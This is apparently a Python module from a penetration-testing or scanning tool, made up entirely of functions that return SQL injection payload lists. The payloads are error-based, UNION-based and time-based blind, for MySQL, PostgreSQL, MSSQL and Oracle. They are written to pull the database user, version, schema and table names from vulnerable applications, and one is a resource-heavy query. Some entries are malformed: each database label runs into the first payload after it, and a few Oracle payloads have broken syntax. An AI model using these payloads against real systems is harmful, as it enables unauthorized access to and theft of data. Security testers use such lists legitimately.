def error_based_sqli():
    payloads = [
        "MySQL\n"
            "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(user(), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) a) -- ",
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, user())) -- ",
            "1' AND UPDATEXML(NULL, CONCAT(0x3a, version()), NULL) -- ",
            "1' AND (SELECT 1/0) -- ",
            "1' AND CAST('abc' AS DECIMAL) -- ",
            "1' AND JSON_EXTRACT('invalid', '$.key') -- "
        ,
        "PostgreSQL\n" 
            "1' AND (SELECT to_char(1,'999') || current_user || to_char(1,'999')) = 1 -- ",
            "1' AND to_number('abc', '999') = 1 -- ",
            "1' AND CAST('text' AS INTEGER) = 1 -- ",
            "1' AND (SELECT COUNT(*) FROM generate_series(1,1000000000)) = 1 -- ",
            "1' AND (SELECT 1/(SELECT COUNT(*) FROM pg_user WHERE usename='admin')) = 1 -- "
        ,
        "MSSQL\n" 
            "1' AND 1=CONVERT(INT, (SELECT @@version)) -- ",
            "1' AND 1=CAST('a' AS INT) -- ",
            "1' AND (SELECT 1/0) -- ",
            "1' AND (SELECT name FROM sysobjects WHERE xtype='U') = 1 -- ",
            "1' AND CHARINDEX('a', 1) = 1 -- "
        ,
        "Oracle\n"
            "1' AND 1=(SELECT UTL_INADDR.GET_HOST_ADDRESS('localhost')) FROM dual -- ",
            "1' AND (SELECT sys_context('userenv','current_user') FROM dual) = 1 -- ",
            "1' AND TO_NUMBER('abc') = 1 -- ",
            "1' AND (SELECT 1 FROM DUAL WHERE 1=1 GROUP BY ROWNUM, ROWNUM) = 1 -- ",
            "1' AND LENGTH(TO_CHAR(SYSDATE)) = 1 -- "
        
    ]

    return payloads



def union_based_sqli():
    return [
        "MySQL\n"
        "1' UNION SELECT null, user() -- ",
        "1' UNION SELECT 1, version(), database() -- ",
        "1' UNION SELECT table_name, column_name FROM information_schema.columns -- ",
        "1' UNION SELECT 1, GROUP_CONCAT(schema_name) FROM information_schema.schemata -- ",

        "PostgreSQL\n"
        "1' UNION SELECT null, current_user -- ",
        "1' UNION SELECT 1, version(), current_database() -- ",
        "1' UNION SELECT table_name, column_name FROM information_schema.columns -- ",

        "MSSQL\n"
        "1' UNION SELECT NULL, SYSTEM_USER -- ",
        "1' UNION SELECT name, type FROM sysobjects -- ",
        "1' UNION SELECT 1, @@version -- ",

        "Oracle\n"
        "1' UNION SELECT NULL, user FROM dual -- ",
        "1' UNION SELECT table_name, column_name FROM all_tab_columns -- ",
        "1' UNION SELECT 1, banner FROM v$version -- "
    ]




def blind_sqli():
    return [
        "MySQL\n"
        "1' AND (SELECT IF(1=1, SLEEP(5), 0)) -- ",
        "1' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) -- ",
        "1' AND ASCII(SUBSTRING((SELECT user()),1,1)) > 64 -- ",

        "PostgreSQL\n"
        "1' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END -- ",
        "1' AND ASCII(SUBSTRING(current_user,1,1)) > 64 -- ",

        "MSSQL\n"
        "1' IF (1=1) WAITFOR DELAY '0:0:5' -- ",
        "1' AND ASCII(SUBSTRING(SYSTEM_USER,1,1)) > 64 -- ",

        "Oracle\n"
        "1' AND CASE WHEN 1=1 THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM dual -- ",
        "1' AND ASCII(SUBSTR(USER,1,1)) > 64 FROM dual -- "
    ]
